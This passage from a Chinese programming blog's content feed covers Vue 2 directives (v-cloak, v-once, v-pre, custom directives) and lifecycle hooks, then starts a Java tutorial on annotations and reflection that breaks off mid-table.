class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span> =<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h2</span> <span class="attr">v-cloak</span>&gt;</span>&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">            <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="javascript">            <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="javascript">                <span class="attr">name</span>:<span class="string">&#x27;你好世界&#x27;</span></span></span><br><span class="line"><span class="javascript">            &#125;,</span></span><br><span class="line"><span class="javascript">            <span class="attr">methods</span>: &#123;</span></span><br><span class="line"><span class="javascript">            </span></span><br><span class="line"><span class="javascript">            &#125;,</span></span><br><span class="line"><span class="javascript">        &#125;);</span></span><br><span class="line"><span class="javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="v-once指令"><a href="#v-once指令" class="headerlink" title="v-once指令"></a>v-once指令</h2><ul><li>v-once所在节点在初次动态渲染后，就视为静态内容了</li><li>以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span> =<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span> <span class="attr">v-once</span>&gt;</span>初始化的n值为:&#123;&#123;n&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>当前的n值为:&#123;&#123;n&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;n++&quot;</span>&gt;</span>点我n+1<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="javascript">        <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="javascript">            <span class="attr">n</span>:<span class="number">1</span></span></span><br><span class="line"><span class="javascript">        &#125;,</span></span><br><span class="line"><span class="javascript">    &#125;);</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="v-pre指令"><a href="#v-pre指令" class="headerlink" title="v-pre指令"></a>v-pre指令</h2><ul><li>跳过其所在节点的编译过程</li><li>可以利用它跳过：没有使用指令语法、没有使用插值语法的节点，会加快编译</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span> =<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span> <span class="attr">v-pre</span>&gt;</span>Learn Vue!<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>当前的n值为:&#123;&#123;n&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;n++&quot;</span>&gt;</span>点我n+1<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="javascript">        <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="javascript">            <span class="attr">n</span>:<span class="number">1</span></span></span><br><span class="line"><span class="javascript">        &#125;,</span></span><br><span class="line"><span class="javascript">    &#125;);</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="自定义指令"><a href="#自定义指令" class="headerlink" title="自定义指令"></a>自定义指令</h2><p>除了核心功能默认内置的指令 (<code>v-model</code> 和 <code>v-show</code>)，Vue 也允许注册自定义指令。注意，在 Vue2.0 中，代码复用和抽象的主要形式是组件。然而，有的情况下，你仍然需要对普通 DOM 元素进行底层操作，这时候就会用到自定义指令。</p><p>在实例中配置directives</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span> </span><br><span class="line">        <span class="tag">&lt;<span class="name">h2</span>&gt;</span>当前的n值是: <span class="tag">&lt;<span class="name">span</span> <span class="attr">v-text</span>=<span class="string">&quot;n&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span> <span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h2</span>&gt;</span>放大10倍后的n值是 <span class="tag">&lt;<span class="name">span</span> <span class="attr">v-big</span>=<span class="string">&quot;n&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span> <span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;n++&quot;</span>&gt;</span>点我n+1<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;&quot;</span> <span class="attr">id</span>=<span class="string">&quot;&quot;</span> <span class="attr">v-fbind:value</span>=<span class="string">&quot;n&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">     <span class="comment">// 全局指令</span></span></span><br><span class="line"><span class="javascript">     Vue.directive(<span class="string">&quot;fbind&quot;</span>, &#123;</span></span><br><span class="line"><span class="javascript">         <span class="comment">// 指令与元素成功绑定时</span></span></span><br><span class="line"><span class="javascript">         <span class="function"><span class="title">bind</span>(<span class="params">element, binding</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                    <span class="built_in">console</span>.log(<span class="string">&#x27;bind&#x27;</span>);</span></span><br><span class="line"><span class="javascript">                    element.value = binding.value</span></span><br><span class="line"><span class="javascript">                &#125;,</span></span><br><span class="line"><span class="javascript">                <span class="comment">//  指令所在元素被插入页面时</span></span></span><br><span class="line"><span class="javascript">                <span class="function"><span class="title">inserted</span>(<span class="params">element, binding</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                    <span class="built_in">console</span>.log(<span class="string">&#x27;inserted&#x27;</span>);</span></span><br><span class="line"><span class="javascript">                    element.focus()</span></span><br><span class="line"><span class="javascript">                &#125;,</span></span><br><span class="line"><span class="javascript">                <span class="comment">// 指令所在模板被重新解析时</span></span></span><br><span class="line"><span class="javascript">                <span class="function"><span class="title">update</span>(<span class="params">element, binding</span>)</span> &#123;</span></span><br><span class="line"><span class="javascript">                    <span class="built_in">console</span>.log(<span class="string">&#x27;update&#x27;</span>);</span></span><br><span class="line"><span class="javascript">                    element.value = binding.value</span></span><br><span class="line"><span class="javascript">                    </span></span><br><span class="line"><span class="javascript">                &#125;</span></span><br><span class="line"><span class="javascript">     &#125;);</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">     <span class="keyword">let</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">         <span class="attr">el</span>:<span class="string">&quot;#root&quot;</span>,</span></span><br><span class="line"><span class="javascript">         <span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="javascript">            <span class="attr">n</span>:<span class="number">1</span></span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">        &#125;,</span></span><br><span class="line"><span class="javascript">        <span class="attr">methods</span>:&#123;</span></span><br><span class="line"><span class="javascript">           </span></span><br><span class="line"><span class="javascript">        &#125;,</span></span><br><span class="line"><span class="javascript">        <span class="attr">computed</span>:&#123;</span></span><br><span class="line"><span class="javascript">            </span></span><br><span class="line"><span class="javascript">        &#125;,</span></span><br><span class="line"><span class="javascript">        <span class="attr">directives</span>:&#123;</span></span><br><span class="line"><span class="javascript">            <span class="comment">// 两个值 第一个是真实的dom元素, 第二个是指令中的value, 指令在所在模板被重新解析时发生变化</span></span></span><br><span class="line"><span class="javascript">            <span class="function"><span class="title">big</span>(<span class="params">element, binding</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                element.innerText = binding.value * <span class="number">10</span></span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">            &#125;,</span></span><br><span class="line"><span class="javascript">            <span class="comment">// fbind:&#123;</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">//     // 指令与元素成功绑定时</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">//     bind(element, binding)&#123;</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">//         console.log(&#x27;bind&#x27;);</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">//         element.value = binding.value</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">//     &#125;,</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">//     //  指令所在元素被插入页面时</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">//     inserted(element, binding)&#123;</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">//         console.log(&#x27;inserted&#x27;);</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">//         element.focus()</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">//     &#125;,</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">//     // 指令所在模板被重新解析时</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">//     update(element, binding) &#123;</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">//         console.log(&#x27;update&#x27;);</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">//         element.value = binding.value</span></span></span><br><span class="line"><span class="javascript">                    </span></span><br><span class="line"><span class="javascript">            <span class="comment">//     &#125;</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">// &#125;</span></span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">        &#125;</span></span><br><span class="line"><span class="javascript">     &#125;);</span></span><br><span class="line"><span class="javascript"> </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="生命周期"><a href="#生命周期" class="headerlink" title="生命周期"></a>生命周期</h1><h2 id="生命周期环节图"><a href="#生命周期环节图" class="headerlink" title="生命周期环节图"></a>生命周期环节图</h2><ol><li>生命周期又名生命回调函数、生命周期函数、声明周期钩子</li><li>是Vue在关键时刻帮我们调用的一些特殊名称的函数</li><li>声明周期函数的名字不可更改，但函数的具体内容是根据需求编写的</li><li>生命周期函数中的this指向的是vm或者是组件实例对象</li><li>生命周期函数也叫钩子函数</li></ol><p><img src="https://raw.githubusercontent.com/gwlnigth/upic/main/img/202202221854858.png"></p><h2 id="四对生命周期函数"><a href="#四对生命周期函数" class="headerlink" title="四对生命周期函数"></a>四对生命周期函数</h2><blockquote><p>vm的生命周期</p><p>​    将要创建 ===&gt; 调用beforeCreate函数</p><p>​    创建完毕 ===&gt; 调用created函数</p><p>​    将要挂载 ===&gt; 调用beforeMount函数</p><p>​    挂载完毕 ===&gt; 调用mounted函数</p><p>​    将要更新 ===&gt; 调用beforeUpdate函数</p><p>​    更新完毕 ===&gt; 调用update函数</p><p>​    将要销毁 ===&gt; 调用beforeDestroy函数</p><p>​    销毁完毕 ===&gt; 调用destroyed函数</p></blockquote><h3 id="beforeCreate创建前"><a href="#beforeCreate创建前" class="headerlink" title="beforeCreate创建前"></a>beforeCreate创建前</h3><p>初始化：一切刚刚开始，数据代理未开始, 此时无法通过vm访问到data中的数据、methods中配置的方法</p><p>在数据检测、数据代理开始之前调用</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">beforeCreate</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">     <span class="built_in">console</span>.log(<span class="string">&#x27;beforeCreate&#x27;</span>, <span class="built_in">this</span>);</span><br><span class="line">     <span class="keyword">debugger</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="created创建"><a href="#created创建" class="headerlink" title="created创建"></a>created创建</h3><p>初始化：数据检测、数据代理开始， 此时可以通过vm访问到data中的数据、methods中配置的方法</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">created</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;created&#x27;</span>, <span class="built_in">this</span>);</span><br><span class="line"><span class="keyword">debugger</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="beforeMount挂载前"><a href="#beforeMount挂载前" class="headerlink" title="beforeMount挂载前"></a>beforeMount挂载前</h3><p>此时页面呈现的是未经过Vue编译的DOM结构</p><p>所有对DOM操作最后都将失效</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">beforeMount</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;beforeMount&#x27;</span>, <span class="built_in">this</span>);</span><br><span class="line"><span class="keyword">debugger</span>;        </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="mounted挂载"><a href="#mounted挂载" class="headerlink" title="mounted挂载"></a>mounted挂载</h3><p>此时页面呈现的都是经过Vue编译的DOM</p><p>对DOM的操作均有效，至此初始化过程结束，一般在此进行:开启定时器、发送网络请求、订阅消息、绑定事件、等初始化动作</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">mounted</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;mounted&#x27;</span>, <span class="built_in">this</span>);</span><br><span class="line">    <span class="keyword">debugger</span>;      </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="beforeUpdate更新前"><a href="#beforeUpdate更新前" class="headerlink" title="beforeUpdate更新前"></a>beforeUpdate更新前</h3><p>此时数据是最新的但是网页时旧的（页面更新尚未和数据保持同步）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">beforeUpdate</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;beforeUpdate&#x27;</span>, <span class="built_in">this</span>);</span><br><span class="line"><span class="keyword">debugger</span>;            </span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><h3 id="updated更新"><a href="#updated更新" class="headerlink" title="updated更新"></a>updated更新</h3><p>此时数据是最新的，页面也是最新的（页面和数据保持同步）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">updated</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;updated&#x27;</span>, <span class="built_in">this</span>);</span><br><span class="line">    <span class="keyword">debugger</span>;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="beforeDestroy销毁前"><a href="#beforeDestroy销毁前" class="headerlink" title="beforeDestroy销毁前"></a>beforeDestroy销毁前</h3><p>此时vm中所有的: data 、methods、指令等等都处于可用状态（<code>对数据的修改将不会生效</code>）马上要执行销毁过程，一般在此阶段关闭定时器、取消订阅消息、解绑自定义事件等收尾工作</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">beforeDestroy</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;beforeDestroy&#x27;</span>, <span class="built_in">this</span>);        </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="destroy销毁"><a href="#destroy销毁" class="headerlink" title="destroy销毁"></a>destroy销毁</h3><p>完全销毁一个实例。清理它与其它实例的连接，解绑他的全部指令以及监听事件（<code>自定义事件不包含已经绑定上DOM的事件</code>）</p><p>销毁后Vue开发者工具将会看不到任何信息</p><p>销毁后的自定义事件会失效，但是原生的DOM事件依然有效</p><p>一般不会再让beforeDestroy操作数据，因为即便操作数据也不会再触发更新流程</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">destroyed() &#123;</span><br><span class="line">console.log(<span class="string">&#x27;beforeDestroy&#x27;</span>, <span class="keyword">this</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java注解反射</title>
      <link href="/2022/02/03/%E6%B3%A8%E8%A7%A3%E5%8F%8D%E5%B0%84/"/>
      <url>/2022/02/03/%E6%B3%A8%E8%A7%A3%E5%8F%8D%E5%B0%84/</url>
      
        <content type="html"><![CDATA[<center><h1>注解反射</h1></center><h1 id="简介注解"><a href="#简介注解" class="headerlink" title="简介注解"></a>简介注解</h1><p>注解英文名<code>Annotation</code>是JDK开始引入的新技术</p><p>Annotation的作用:</p><ul><li>不是程序本身，可以对程序做出解释，这一点和注释(Comment)没什么区别</li><li>可以被其他程序读取（比如编译器）</li></ul><p>Annotation的格式:</p><ul><li>注解是以”@注释名”在代码中存在，还可以添加一些参数值,例如<code>@SuppressWarnings(Value=&quot;unuchecked&quot;)</code></li></ul><p>Annotation的使用</p><ul><li>可以附在package,class,method,field等上面，相当于给他们添加了额外的辅助信息，我们可以通过反射机制编程实现对这些元数据的访问。</li></ul><h1 id="内置注解"><a href="#内置注解" class="headerlink" title="内置注解"></a>内置注解</h1><p>内置注解:</p><table><thead><tr><th>注解名</th><th>注解作用</th></tr></thead><tbody><tr><td>@Override</td><td>修饰子类重写父类的方法</td></tr><tr><td>@Deprecated</td><td>修饰已经过时的方法</td></tr><tr><td>@SuppressWarnings</td><td>镇压警告, 用于抑制编译时期的警告错误</td></tr></tbody></table><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@SuppressWarnings</span>和前两个有所不同,需要添加一定的参数,这些参数都已经定义好了的</span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;all&quot;)</span> <span class="comment">// 镇压所有</span></span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span> <span class="comment">//.镇压未检查的</span></span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;value=&#123;&quot;unchecked&quot;, &quot;deprecation&quot;&#125;)</span> <span class="comment">// 同时镇压未检查和过时的方法</span></span><br></pre></td></tr></table></figure><h1 id="元注解"><a href="#元注解" class="headerlink" title="元注解"></a>元注解</h1><p>元注解的作用是负责解释其他注解的注解, Java定义了4个标准的meta-annotation类型,他们呢被用来提供其他annotation类型说明。</p><p>这些类型和它们所支持的类在java.lang.annotation包中可以找到(@Target,@Retention,@Documented,@Inherited)</p><ul><li><p>@Target: 用于描述注解的使用范围</p></li><li><p>@Retention: 表示需要在什么级别保持该注释信息，用于描述注解的生命周期</p><ul><li>(SOURCE &lt; CLASS &lt; RUNTIME)</li></ul></li><li><p>@Document: 说明该注解将包含在javadoc中</p></li><li><p>@Inherited: 说明子类可以继承父类中的该注解</p></li></ul><h1 id="自定义注解"><a href="#自定义注解" class="headerlink" title="自定义注解"></a>自定义注解</h1><ul><li><p>@ interface 用来声明一个注解</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">格式</span><br><span class="line">    <span class="keyword">public</span> @ <span class="class"><span class="keyword">interface</span> 注解名</span>&#123; 定义内容 &#125;</span><br></pre></td></tr></table></figure></li><li><p>其中的每一个方法实际上是声明了一个配置参数</p></li><li><p>方法的名称就是参数的名称</p></li><li><p>返回值类型就是参数的类型( 返回值只能是基本类型, Class, String,  enum )</p></li><li><p>可以通过default来声明参数的默认值</p></li><li><p>如果有一个参数成员，一般参数名为value</p></li><li><p>注解元素必须要有值，我们定义注解元素时，经常使用空字符串,0作为默认值</p></li></ul><p>定义注解</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//定义注解</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@Target(ElementType.METHOD)</span> <span class="comment">// 在方法上使用有效</span></span><br><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span> <span class="comment">// 在运行时有效</span></span><br><span class="line"><span class="meta">@Documented</span> <span class="comment">//表示是否将注解生成到文档里面</span></span><br><span class="line"><span class="meta">@Inherited</span> <span class="comment">// 是否让子类继承父类注解</span></span><br><span class="line"><span class="meta">@interface</span> MyAnnotationTest&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>定义注解参数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//定义注解参数</span></span><br><span class="line"><span class="meta">@Target(&#123;ElementType.METHOD, ElementType.TYPE&#125;)</span></span><br><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class="line"><span class="meta">@interface</span> MyAnnotationTest&#123;</span><br><span class="line">    <span class="comment">// 定义注解参数 格式:  数据类型 + 参数名 + ()</span></span><br><span class="line">    <span class="function">String <span class="title">name</span><span class="params">()</span> <span class="keyword">default</span> &quot;&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">age</span><span class="params">()</span> <span class="keyword">default</span> -1</span>; <span class="comment">// 默认值为-1 表示不存在</span></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">id</span><span class="params">()</span> <span class="keyword">default</span> 0</span>;</span><br><span class="line">    String[] array() <span class="keyword">default</span> &#123;<span class="string">&quot;test1&quot;</span>, <span class="string">&quot;test2&quot;</span>&#125;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h1><p>反射(Refection) 是Java被视为动态语言的关键，反射机制允许程序在执行期借助ReflectionAPI取得任何类的内部信息，并能直接操作任意对象的内部属性以及方法</p><p><code>Class c = Class.forName(&quot;java.lang.string&quot;);</code></p><p>加载完类之后，在堆内存的方法区中就产生了一个</p><p>Clas类型的对象（一个类只有一个Class对象），这个对象就包含了完整的类的结构信息。我们可以通过这个对象看到类的结构。这个对象就像是一面镜子，透过这个镜子看到类的结构，所以我们形象称为<code>反射</code></p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">正常方式:引入需要的&quot;包类&quot;名称 -&gt; 通过new实例化 -&gt; 取得示例对象</span><br><span class="line"></span><br><span class="line">反射方式: 实例化对象 -&gt; getClass() 方法 -&gt; 得到完整的&quot;包类&quot;名称</span><br></pre></td></tr></table></figure><p><code>优点</code></p><p>​    可以实现动态创建对象和编译，体现出很大的灵活性</p><p><code>缺点</code></p><p>​    对性能有影响，使用反射基本上就是一种解释操作，我们可以告诉JVM，我们希望做什么并且它满足我们的要求，这类操作总是慢于执行相同的操作。</p><p><code>反射主要Api</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">java.lang.Class : 代表一个类</span><br><span class="line">java.lang.reflect.Method : 代表类的方法</span><br><span class="line">java.lang.reflect.Field : 代表类的成员变量</span><br><span class="line">java.lang.reflect.Constructor : 代表类的构造器</span><br></pre></td></tr></table></figure><table><thead><tr><th><strong>类名</strong></th><th><strong>用途</strong></th></tr></thead><tbody><tr><td>Class类</td><td>代表类的实体，在运行的Java应用程序中表示类和接口</td></tr><tr><td>Field类</td><td>代表类的成员变量（成员变量也称为类的属性）</td></tr><tr><td>Method类</td><td>代表类的方法</td></tr><tr><td>Constructor类</td><td>代表类的构造方法</td></tr></tbody></table><h1 id="Class类"><a href="#Class类" class="headerlink" title="Class类"></a>Class类</h1><p>Class代表类的实体，在运行的Java应用程序中表示类和接口。在这个类中提供了很多有用的方法，这里对他们简单的分类介绍。</p><ul><li>获得类相关的方法</li></ul><table><thead><tr><th><strong>方法</strong></th><th><strong>方法</strong></th></tr></thead><tbody><tr><td>asSubclass(Class<U> 